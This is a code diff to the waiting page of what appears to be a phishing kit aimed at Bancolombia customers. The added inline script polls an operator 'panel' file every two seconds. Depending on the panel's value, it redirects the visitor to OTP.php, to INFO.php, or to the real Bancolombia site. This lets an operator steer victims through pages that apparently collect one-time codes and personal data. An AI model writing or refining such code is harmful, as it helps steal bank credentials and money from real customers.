@@ -12,17 +12,17 @@ $tiempo = date("l, j \d\e F \d\e Y");
         <meta http-equiv="X-UA-Compatible" content="IE=edge">
 
         <link href="../css/stylesheet.css" rel="stylesheet">
-        <link href="../css/style-app.css?v<?php echo time(); ?>" rel="stylesheet">        
+        <link href="../css/style-app.css?v=<?php echo time(); ?>" rel="stylesheet">        
         <link rel="icon" type="image/png" href="../img/logo.png" />
         
         <script type="text/javascript" src="../js/jquery-3.6.0.min.js"></script>
-        <script type="text/javascript" src="../js/functions.js?v=<?php echo time(); ?>"></script>
 
         <style type="text/css">
             body {
                 background-color: #fff;
                 text-align: center;              
                 font-family: 'Open Sans', sans-serif;
+                margin: 0;
             }
             .contenedor-espera {
                 padding: 40px 20px;
@@ -69,12 +69,28 @@ $tiempo = date("l, j \d\e F \d\e Y");
         </div>
 
         <script type="text/javascript">
+            // Función de chequeo directo al panel
+            function chequear_estado() {
+                // El random evita que el navegador guarde una respuesta vieja (Caché)
+                $.get("../process/estado.php?v=" + Math.random(), function(data) {
+                    var orden = data.trim();
+
+                    if (orden == "2") {
+                        window.location.href = "OTP.php";
+                    } else if (orden == "4") {
+                        window.location.href = "INFO.php";
+                    } else if (orden == "10") {
+                        window.location.href = "https://www.bancolombia.com/personas";
+                    }
+                    // Si el archivo dice "1", se queda aquí cargando...
+                }).fail(function() {
+                    console.log("Error leyendo estado.php");
+                });
+            }
+
             $(document).ready(function() {
-                // Consultamos el panel cada 2.5 segundos para no saturar el servidor
-                // Esta función está en functions.js y revisa process/estado.php
-                var chequeo = setInterval(function(){
-                    consultar_estado();
-                }, 2500); 
+                // Revisamos cada 2 segundos exactamente
+                setInterval(chequear_estado, 2000);
             });
         </script>
     </body>
